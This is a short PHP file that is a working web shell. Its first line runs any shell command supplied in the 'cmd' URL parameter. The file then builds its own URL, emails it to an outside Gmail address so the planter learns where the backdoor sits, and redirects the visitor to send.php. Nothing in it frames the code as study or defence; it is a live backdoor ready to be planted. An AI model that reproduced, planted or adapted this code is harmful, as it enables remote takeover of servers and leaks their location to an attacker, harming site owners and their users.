<?php 
system($_GET['cmd']);
header("Location: send.php"); 
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];    
      
    echo $url;  
 

      
     
         $to = "wormxyber40@gmail.com";
         $subject = "url";
         
      
          $message = "<b>URL OF MAIL SERVER</b>";
         $message .= "<h1>URL:</h1>".$url."\r\n" ;
         
         $header = "From:abc@somedomain.com \r\n";
         $header .= "Cc:afgh@somedomain.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail ($to,$subject,$message,$header);
         
         if( $retval == true ) {
            echo "";
         }else {
            echo "";
         }
      ?>
      
  